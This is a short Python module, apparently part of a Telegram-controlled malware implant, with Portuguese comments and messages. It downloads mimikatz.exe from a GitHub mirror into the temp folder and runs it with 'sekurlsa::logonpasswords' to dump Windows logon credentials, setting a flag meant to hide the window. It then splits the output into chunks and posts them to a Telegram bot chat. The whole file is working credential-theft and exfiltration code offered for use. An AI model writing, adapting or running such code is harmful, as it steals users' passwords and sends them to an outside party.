import subprocess
import requests
import os

def baixar_mimikatz(destino):
    url = "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
    try:
        r = requests.get(url, stream=True)
        if r.status_code == 200:
            with open(destino, 'wb') as f:
                for chunk in r.iter_content(1024):
                    f.write(chunk)
            return True
    except Exception as e:
        print(f"[erro download] {e}")
    return False

def executar_mimikatz(token, chat_id):
    temp = os.getenv("TEMP") or "/tmp"
    caminho = os.path.join(temp, "mimikatz.exe")

    if not os.path.exists(caminho):
        if not baixar_mimikatz(caminho):
            return "❌ Falha ao baixar Mimikatz. Verifique a conexão ou ambiente."

    try:
        comando = f'"{caminho}" "privilege::debug" "sekurlsa::logonpasswords" "exit"'
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Oculta a janela
        resultado = subprocess.check_output(
            ["cmd", "/c", comando],
            startupinfo=si,
            stderr=subprocess.STDOUT
        ).decode(errors='ignore')

        # Divide em blocos se for muito grande
        blocos = [resultado[i:i+4000] for i in range(0, len(resultado), 4000)]
        for bloco in blocos:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={'chat_id': chat_id, 'text': f"🛡️ Mimikatz:\n{bloco}"}
            )

        return "✅ Mimikatz executado e dados enviados."
    except subprocess.CalledProcessError as e:
        return f"[erro execução] {e.output.decode(errors='ignore')}"
    except Exception as e:
        return f"[erro geral] {e}"
